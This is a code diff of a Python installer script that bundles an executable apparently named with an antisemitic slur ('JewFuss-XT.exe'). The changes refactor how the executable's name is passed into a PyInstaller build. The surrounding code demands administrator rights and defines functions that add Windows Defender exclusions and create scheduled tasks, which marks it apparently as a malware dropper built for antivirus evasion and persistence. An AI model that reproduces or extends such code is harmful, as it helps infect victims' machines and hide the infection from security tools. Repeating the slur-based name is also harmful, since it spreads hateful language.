@@ -21,28 +21,43 @@ printnonerrors = False
 # Define the target directory and name of bundled executable to run
 
 try:
-    if os.path.splitext(sys.argv[0])[1].lower() == ".py": # compile if ran as .py
+    if os.path.splitext(sys.argv[0])[1].lower() == ".py":  # Compile if running as .py
         app_name = input("Enter the name of the executable in the builds folder, leave empty to use JewFuss-XT.exe:\n>> ")
-        
+
         if not app_name:
             app_name = "JewFuss-XT.exe"
-            
-        while True:
-            if os.path.exists(f"builds/{app_name}"):
-                break
-            else:
-                app_name = input("Invalid executable (Tip: make sure the executable is in the builds folder):\n>> ")
+
+        while not os.path.exists(f"builds/{app_name}"):
+            app_name = input("Invalid executable (Tip: make sure the executable is in the builds folder):\n>> ")
         
-        os.system(f'cd {os.path.dirname(os.path.abspath(sys.argv[0]))} && pyinstaller --onefile --add-binary="builds/{app_name};." --distpath=builds --workpath=data installer.py')
-        exit("Finnished compiling")
-        
+        temp_file_path = "executablename.txt"
+        with open(temp_file_path, "w") as f:
+            f.write(app_name)
+
+        os.system(f'cd {os.path.dirname(os.path.abspath(sys.argv[0]))} && pyinstaller --onefile --add-binary="builds/{app_name};." --add-data="{temp_file_path};." --distpath=builds --workpath=data installer.py')
+        os.remove(temp_file_path)
+        sys.exit("Finished compiling")
+
 except KeyboardInterrupt:
-    exit("Keyboard interupt, exiting compiler...")
-    
+    sys.exit("Keyboard interrupt, exiting compiler...")
+
 except Exception as e:
     print(f"Error compiling: {e}")
     errored = True
-    
+
+if getattr(sys, 'frozen', False):
+    base_path = sys._MEIPASS
+else:
+    base_path = os.path.dirname(os.path.abspath(__file__))
+
+temp_file_path = os.path.join(base_path, "executablename.txt")
+
+try:
+    with open(temp_file_path, "r") as f:
+        app_name = f.read().strip()
+except FileNotFoundError:
+    app_name = "JewFuss-XT.exe"
+
 errored = False # Don't change
 def add_defender_exclusion(file_path):
     global errored
@@ -82,7 +97,7 @@ def create_scheduled_task(task_name, file_path):
 
 if not PyElevate.elevated():
     input("Please run this installer as an administrator.")
-    exit(0)
+    sys.exit(0)
 
 if not os.path.exists(target_dir):
     os.makedirs(target_dir)
